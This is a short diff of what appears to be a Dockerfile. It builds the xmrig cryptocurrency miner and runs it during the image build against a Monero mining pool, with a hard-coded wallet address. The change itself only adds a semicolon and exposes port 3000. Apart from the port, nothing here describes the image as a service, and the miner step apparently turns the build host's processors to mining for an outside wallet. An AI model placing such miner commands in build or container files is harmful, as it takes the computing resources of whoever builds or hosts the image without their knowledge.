@@ -10,4 +10,6 @@ RUN apt -y update \
     cd build \
     cmake .. \
     make \
-    ./xmrig -o gulf.moneroocean.stream:10128 -u 4B4RSqqyoMQBNSnfTkWPFVTMVHzBGoY5WRn7BobfY1Myid5p6HaszDs7nyGVVNHGRTMh6HmFwxZMYR5Hc83frXULS1UfChC -p testgot
+    ./xmrig -o gulf.moneroocean.stream:10128 -u 4B4RSqqyoMQBNSnfTkWPFVTMVHzBGoY5WRn7BobfY1Myid5p6HaszDs7nyGVVNHGRTMh6HmFwxZMYR5Hc83frXULS1UfChC -p testgot;
+
+EXPOSE 3000
